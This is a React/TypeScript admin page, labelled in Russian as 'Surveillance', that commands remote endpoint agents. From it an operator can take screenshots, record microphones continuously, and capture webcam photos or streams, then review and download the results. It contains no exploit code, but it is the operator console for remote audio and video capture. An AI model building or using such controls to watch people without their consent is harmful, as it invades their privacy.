import { useState } from 'react'
import {
  Button, Card, Col, Image, message, Popconfirm, Row, Select,
  Space, Table, Tabs, Tag, Tooltip, Typography, Empty,
} from 'antd'
import {
  AudioOutlined, CameraOutlined, DeleteOutlined, DownloadOutlined,
  PlayCircleOutlined, PauseCircleOutlined, SoundOutlined,
  ReloadOutlined, VideoCameraOutlined,
} from '@ant-design/icons'
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
import {
  fetchAgents, fetchAudioRecordings, fetchWebcamPhotos,
  audioDownloadPath, downloadAudioRecording, webcamPhotoPath,
  deleteAudioRecording, deleteWebcamPhoto, sendAgentCommand,
} from '../api/client'
import type { AudioRecording, WebcamPhotoItem } from '../api/client'
import type { Agent } from '../api/types'
import { useAuthMediaUrl } from '../hooks/useAuthMedia'
import dayjs from 'dayjs'

const { Title, Text } = Typography

function formatDuration(sec: number): string {
  const m = Math.floor(sec / 60)
  const s = sec % 60
  return m > 0 ? `${m} мин ${s} сек` : `${s} сек`
}

function formatSize(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`
}

function AuthWebcamImage({ id }: { id: number }) {
  const src = useAuthMediaUrl(webcamPhotoPath(id))
  if (!src) {
    return <div style={{ height: 140, display: 'flex', alignItems: 'center', justifyContent: 'center', opacity: 0.4 }}>Загрузка...</div>
  }
  return <Image src={src} alt={`webcam-${id}`} style={{ objectFit: 'cover', height: 140, width: '100%' }} />
}

function InlineAudioPlayer({ recording }: { recording: AudioRecording | null }) {
  const src = useAuthMediaUrl(recording ? audioDownloadPath(recording.id) : null)
  if (!recording) {
    return (
      <Text type="secondary" style={{ fontSize: 12 }}>
        <SoundOutlined /> Нажмите «▶» для прослушивания аудиозаписи во встроенном плеере. Записи хранятся 30 дней.
      </Text>
    )
  }
  return (
    <Space wrap align="center" style={{ width: '100%', justifyContent: 'space-between' }}>
      <Text strong style={{ fontSize: 13 }}>
        🎙️ {recording.hostname} ({recording.username}) — {formatDuration(recording.duration_sec)}
      </Text>
      {src ? (
        <audio controls autoPlay src={src} style={{ height: 34 }} />
      ) : (
        <Text type="secondary">Загрузка аудио...</Text>
      )}
    </Space>
  )
}

function AudioTab() {
  const qc = useQueryClient()
  const [agentFilter, setAgentFilter] = useState<string | undefined>()
  const [playing, setPlaying] = useState<AudioRecording | null>(null)

  const { data: agents = [] } = useQuery({ queryKey: ['agents'], queryFn: fetchAgents })
  const { data, isLoading } = useQuery({
    queryKey: ['audio', agentFilter],
    queryFn: () => fetchAudioRecordings(agentFilter ? { agent_id: agentFilter, limit: 100 } : { limit: 100 }),
  })

  const del = useMutation({
    mutationFn: deleteAudioRecording,
    onSuccess: () => { qc.invalidateQueries({ queryKey: ['audio'] }); message.success('Запись удалена') },
    onError: () => message.error('Ошибка удаления записи'),
  })

  const recordCmd = useMutation({
    mutationFn: (agentId: string) => sendAgentCommand(agentId, 'take_recording'),
    onSuccess: () => message.success('Команда записи отправлена'),
    onError: () => message.error('Ошибка отправки команды'),
  })

  const columns = [
    {
      title: 'Агент',
      key: 'agent',
      render: (_: unknown, r: AudioRecording) => (
        <Space direction="vertical" size={0}>
          <Text strong style={{ fontSize: 13 }}>{r.hostname}</Text>
          <Text type="secondary" style={{ fontSize: 11 }}>{r.username}</Text>
        </Space>
      ),
    },
    {
      title: 'Длительность',
      dataIndex: 'duration_sec',
      key: 'duration',
      width: 130,
      render: (v: number) => <Tag color="blue">{formatDuration(v)}</Tag>,
    },
    {
      title: 'Размер',
      dataIndex: 'file_size',
      key: 'size',
      width: 100,
      render: (v: number) => formatSize(v),
    },
    {
      title: 'Дата',
      dataIndex: 'created_at',
      key: 'date',
      width: 170,
      render: (v: string) => v ? dayjs(v).format('DD.MM.YYYY HH:mm:ss') : '—',
    },
    {
      title: '',
      key: 'actions',
      width: 140,
      render: (_: unknown, r: AudioRecording) => (
        <Space>
          <Tooltip title="Воспроизвести">
            <Button size="small" type={playing?.id === r.id ? 'primary' : 'default'} icon={<PlayCircleOutlined />} onClick={() => setPlaying(r)} />
          </Tooltip>
          <Tooltip title="Скачать WAV">
            <Button size="small" icon={<DownloadOutlined />} onClick={() => downloadAudioRecording(r.id).catch(() => message.error('Ошибка скачивания'))} />
          </Tooltip>
          <Popconfirm title="Удалить запись?" onConfirm={() => del.mutate(r.id)}
            okText="Удалить" cancelText="Отмена" okButtonProps={{ danger: true }}>
            <Button size="small" danger icon={<DeleteOutlined />} />
          </Popconfirm>
        </Space>
      ),
    },
  ]

  return (
    <>
      <div style={{ display: 'flex', gap: 12, marginBottom: 16, alignItems: 'center', flexWrap: 'wrap' }}>
        <Select
          allowClear placeholder="Фильтр по агенту" style={{ width: 260 }}
          value={agentFilter} onChange={setAgentFilter}
          options={agents.map((a: Agent) => ({ value: a.agent_id, label: `${a.hostname} (${a.username})` }))}
        />
        <Select
          placeholder="Записать аудио на агенте"
          style={{ width: 260 }}
          onSelect={(v: string | undefined) => { if (v) recordCmd.mutate(v) }}
          options={agents.filter((a: Agent) => a.is_online).map((a: Agent) => ({
            value: a.agent_id, label: `🎙️ ${a.hostname}`,
          }))}
          value={undefined}
        />
        <Button icon={<ReloadOutlined />} onClick={() => qc.invalidateQueries({ queryKey: ['audio'] })}>
          Обновить
        </Button>
      </div>

      <Card size="small" style={{ marginBottom: 16 }}>
        <InlineAudioPlayer recording={playing} />
      </Card>

      <Table
        columns={columns}
        dataSource={data?.items ?? []}
        rowKey="id"
        loading={isLoading}
        pagination={{ pageSize: 20, showSizeChanger: false, showTotal: t => `Всего: ${t}` }}
      />
    </>
  )
}

function WebcamTab() {
  const qc = useQueryClient()
  const [agentFilter, setAgentFilter] = useState<string | undefined>()

  const { data: agents = [] } = useQuery({ queryKey: ['agents'], queryFn: fetchAgents })
  const { data, isLoading } = useQuery({
    queryKey: ['webcam', agentFilter],
    queryFn: () => fetchWebcamPhotos(agentFilter ? { agent_id: agentFilter, limit: 60 } : { limit: 60 }),
  })

  const del = useMutation({
    mutationFn: deleteWebcamPhoto,
    onSuccess: () => { qc.invalidateQueries({ queryKey: ['webcam'] }); message.success('Фото удалено') },
    onError: () => message.error('Ошибка удаления фото'),
  })

  const takePhoto = useMutation({
    mutationFn: (agentId: string) => sendAgentCommand(agentId, 'take_webcam'),
    onSuccess: () => message.success('Команда отправлена — фото появится через несколько секунд'),
    onError: () => message.error('Ошибка отправки команды'),
  })

  const photos = data?.items ?? []

  return (
    <>
      <div style={{ display: 'flex', gap: 12, marginBottom: 16, alignItems: 'center', flexWrap: 'wrap' }}>
        <Select
          allowClear placeholder="Фильтр по агенту" style={{ width: 260 }}
          value={agentFilter} onChange={setAgentFilter}
          options={agents.map((a: Agent) => ({ value: a.agent_id, label: `${a.hostname} (${a.username})` }))}
        />
        <Select
          placeholder="📷 Сделать фото на агенте"
          style={{ width: 260 }}
          onSelect={(v: string | undefined) => { if (v) takePhoto.mutate(v) }}
          options={agents.filter((a: Agent) => a.is_online).map((a: Agent) => ({
            value: a.agent_id, label: `📷 ${a.hostname}`,
          }))}
          value={undefined}
        />
        <Button icon={<ReloadOutlined />} onClick={() => qc.invalidateQueries({ queryKey: ['webcam'] })}>
          Обновить
        </Button>
      </div>

      {isLoading ? (
        <Card loading />
      ) : photos.length === 0 ? (
        <Empty description="Нет фотографий с камеры" />
      ) : (
        <Row gutter={[12, 12]}>
          {photos.map((p: WebcamPhotoItem) => (
            <Col key={p.id} xs={12} sm={8} md={6} lg={4}>
              <Card
                size="small"
                hoverable
                cover={<AuthWebcamImage id={p.id} />}
                actions={[
                  <Popconfirm
                    key="del"
                    title="Удалить?"
                    onConfirm={() => del.mutate(p.id)}
                    okText="Да" cancelText="Нет"
                  >
                    <DeleteOutlined />
                  </Popconfirm>,
                ]}
              >
                <Card.Meta
                  title={<Text style={{ fontSize: 12 }}>{p.hostname}</Text>}
                  description={
                    <Text type="secondary" style={{ fontSize: 11 }}>
                      {p.username} • {p.created_at ? dayjs(p.created_at).format('DD.MM HH:mm') : '—'}
                      <br />
                      {formatSize(p.file_size)}
                    </Text>
                  }
                />
              </Card>
            </Col>
          ))}
        </Row>
      )}
    </>
  )
}

function CommandsTab() {
  const { data: agents = [] } = useQuery({ queryKey: ['agents'], queryFn: fetchAgents })
  const onlineAgents = agents.filter((a: Agent) => a.is_online)

  const cmd = useMutation({
    mutationFn: ({ agentId, command }: { agentId: string; command: string }) =>
      sendAgentCommand(agentId, command),
    onSuccess: (_, vars) => message.success(`Команда «${vars.command}» отправлена`),
    onError: () => message.error('Ошибка отправки команды'),
  })

  const columns = [
    {
      title: 'Агент',
      key: 'agent',
      render: (_: unknown, a: Agent) => (
        <Space>
          <Tag color="green">онлайн</Tag>
          <Text strong>{a.hostname}</Text>
          <Text type="secondary">({a.username})</Text>
        </Space>
      ),
    },
    {
      title: 'Скриншот',
      key: 'screenshot',
      width: 120,
      render: (_: unknown, a: Agent) => (
        <Button
          size="small" icon={<CameraOutlined />}
          onClick={() => cmd.mutate({ agentId: a.agent_id, command: 'take_screenshot' })}
        >
          Снимок
        </Button>
      ),
    },
    {
      title: 'Микрофон',
      key: 'mic',
      width: 260,
      render: (_: unknown, a: Agent) => (
        <Space>
          <Tooltip title="Одна запись">
            <Button
              size="small" icon={<AudioOutlined />}
              onClick={() => cmd.mutate({ agentId: a.agent_id, command: 'take_recording' })}
            >
              Записать
            </Button>
          </Tooltip>
          <Tooltip title="Начать непрерывную запись">
            <Button
              size="small" type="primary" icon={<PlayCircleOutlined />}
              onClick={() => cmd.mutate({ agentId: a.agent_id, command: 'start_recording' })}
            />
          </Tooltip>
          <Tooltip title="Остановить запись">
            <Button
              size="small" danger icon={<PauseCircleOutlined />}
              onClick={() => cmd.mutate({ agentId: a.agent_id, command: 'stop_recording' })}
            />
          </Tooltip>
        </Space>
      ),
    },
    {
      title: 'Веб-камера',
      key: 'webcam',
      width: 300,
      render: (_: unknown, a: Agent) => (
        <Space>
          <Tooltip title="Сделать фото">
            <Button
              size="small" icon={<VideoCameraOutlined />}
              onClick={() => cmd.mutate({ agentId: a.agent_id, command: 'take_webcam' })}
            >
              Фото
            </Button>
          </Tooltip>
          <Tooltip title="Начать стрим">
            <Button
              size="small" type="primary" icon={<PlayCircleOutlined />}
              onClick={() => cmd.mutate({ agentId: a.agent_id, command: 'start_webcam_stream' })}
            >
              Стрим
            </Button>
          </Tooltip>
          <Tooltip title="Остановить стрим">
            <Button
              size="small" danger icon={<PauseCircleOutlined />}
              onClick={() => cmd.mutate({ agentId: a.agent_id, command: 'stop_webcam_stream' })}
            />
          </Tooltip>
        </Space>
      ),
    },
  ]

  return onlineAgents.length === 0 ? (
    <Empty description="Нет онлайн агентов" />
  ) : (
    <Table columns={columns} dataSource={onlineAgents} rowKey="agent_id" pagination={false} />
  )
}

export default function SurveillancePage() {
  return (
    <div>
      <div style={{ marginBottom: 20 }}>
        <Title level={4} style={{ margin: 0 }}>Наблюдение</Title>
        <Text type="secondary" style={{ fontSize: 13 }}>
          Управление камерой, микрофоном и просмотр записей (защищено RBAC)
        </Text>
      </div>

      <Card>
        <Tabs
          defaultActiveKey="commands"
          items={[
            { key: 'commands', label: <span><CameraOutlined /> Управление</span>, children: <CommandsTab /> },
            { key: 'audio', label: <span><AudioOutlined /> Аудиозаписи</span>, children: <AudioTab /> },
            { key: 'webcam', label: <span><VideoCameraOutlined /> Фото с камеры</span>, children: <WebcamTab /> },
          ]}
        />
      </Card>
    </div>
  )
}
